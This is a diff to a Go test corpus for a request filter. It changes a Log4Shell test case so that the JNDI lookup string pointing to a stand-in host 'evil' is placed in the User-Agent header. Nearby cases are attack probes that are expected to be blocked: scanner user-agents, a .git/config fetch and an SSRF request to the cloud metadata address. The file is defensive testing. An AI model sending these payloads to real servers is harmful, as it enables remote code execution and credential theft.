@@ -47,7 +47,7 @@ var verifyCorpus = []verifyCase{
 	// sensitive paths. If the catalog is not wired, they fail instead of passing
 	// quietly.
 	{Name: "catalog: scanner user-agent", Method: "GET", Path: "/", Header: map[string]string{"User-Agent": "Nikto/2.5.0"}, WantBlock: true},
-	{Name: "catalog: log4shell in header", Method: "GET", Path: "/", Header: map[string]string{"X-Api-Version": "${jndi:ldap://evil/a}"}, WantBlock: true},
+	{Name: "catalog: log4shell user-agent", Method: "GET", Path: "/", Header: map[string]string{"User-Agent": "${jndi:ldap://evil/a}"}, WantBlock: true},
 	{Name: "catalog: vcs config file", Method: "GET", Path: "/.git/config", WantBlock: true},
 	{Name: "catalog: ssrf metadata", Method: "GET", Path: "/fetch?url=http://169.254.169.254/latest/meta-data", WantBlock: true},
 	{Name: "catalog: sqlmap user-agent", Method: "GET", Path: "/", Header: map[string]string{"User-Agent": "sqlmap/1.7.2"}, WantBlock: true},
